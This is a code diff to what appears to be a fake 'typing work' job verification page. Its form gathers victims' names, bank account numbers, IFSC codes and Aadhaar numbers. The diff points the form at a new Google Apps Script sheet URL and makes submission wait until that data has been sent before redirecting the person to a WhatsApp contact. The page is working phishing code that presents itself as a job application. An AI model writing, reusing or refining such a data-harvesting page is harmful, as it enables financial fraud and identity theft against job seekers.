@@ -16,7 +16,7 @@
     .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff6482; border-radius: 50%; width: 35px; height: 40px; animation: spin 0.8s linear infinite; margin: 15px auto; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-    /* MODAL POPUPS (Professional Design) */
+    /* MODAL POPUPS */
     .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(10px); }
     .modal-overlay.active { display: flex; }
     .modal-box { background: #13131f; border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 30px; max-width: 550px; width: 100%; position: relative; max-height: 85vh; overflow-y: auto; }
@@ -163,9 +163,9 @@
 
   <script>
     // ----------------------------------------------------
-    // CONSTANTS WITH SAFE QUOTES (YEHI ERROR THA PEHLE)
+    // CONSTANTS WITH YOUR SHEET AND WHATSAPP NUMBER
     // ----------------------------------------------------
-    const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxDw9agbHZur77fFXFCtIpSXsPC0dhnQgVvtBstrPFSJPcAcVi8ZVeJwuYTOkYQTgV9/exec'; 
+    const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbwrVLBlxCFBDqD5c6DK5gPdkcwHphHrUSx-LsnVzFdAc285JdEgyg2vaX3_mwkj0cMi/exec'; 
     const REDIRECT_URL = 'https://wa.me/919661493415'; 
 
     function openModal(id) { document.getElementById(id).classList.add('active'); }
@@ -198,7 +198,7 @@
     }, {threshold: 0.1});
     document.querySelectorAll('.sr').forEach(s => obs.observe(s));
 
-    // Form Logic with SUPER FAST Redirect & Safe Background Saving (Original GET Method)
+    // Form Logic with GUARANTEED Data Save + Fast Redirect
     const form = document.getElementById('verificationForm');
     form.onsubmit = (e) => {
       e.preventDefault();
@@ -221,24 +221,25 @@
       if (d.account.length < 9) { alert("❌ Error: Please enter a valid Bank Account Number"); return; }
       if (!/^[A-Z]{4}0[A-Z0-9]{6}$/.test(d.ifsc)) { alert("❌ Error: Please enter a valid IFSC Code (e.g., SBIN0012345)"); return; }
 
-      // 1. Dikhane ke liye Popup (Bina wait ke)
+      // 1. Show redirecting loader immediately
       document.getElementById('redirectPopup').style.display = 'flex';
       btn.disabled = true;
-      btn.textContent = "Redirecting...";
+      btn.textContent = "Processing...";
 
-      // 2. Data format for Google Sheets (Aapka ORIGINAL 'GET' Method wapas laga diya)
       const params = new URLSearchParams(d).toString();
+      const msg = encodeURIComponent(`Hello Admin, I have submitted my details for Typing Work.\n\n*Name:* ${d.name}\n*State:* ${d.state}\n*Status:* Verification Pending`);
+
+      // 2. WAIT for data to be successfully sent to Google Sheet, THEN redirect
       fetch(`${GOOGLE_SHEET_URL}?${params}`, { 
           method: 'GET', 
           mode: 'no-cors' 
-      }).catch(err => console.log("Silent Save"));
-
-      // 3. Ultra Fast Redirect (Sirf 0.4 Second ke baad WhatsApp par bhej dega)
-      const msg = encodeURIComponent(`Hello Admin, I have submitted my details for Typing Work.\n\n*Name:* ${d.name}\n*State:* ${d.state}\n*Status:* Verification Pending`);
-      
-      setTimeout(() => { 
-        window.location.href = `${REDIRECT_URL}?text=${msg}`; 
-      }, 400);
+      }).then(() => {
+          // Jaise hi data chala jayega (lagbhag 1 sec), WhatsApp khul jayega
+          window.location.href = `${REDIRECT_URL}?text=${msg}`; 
+      }).catch(err => {
+          // Agar internet me issue ho tab bhi atakna nahi chahiye, WhatsApp par bhej do
+          window.location.href = `${REDIRECT_URL}?text=${msg}`; 
+      });
     };
 
     // Numbers Only Restriction for Aadhaar and Bank Account
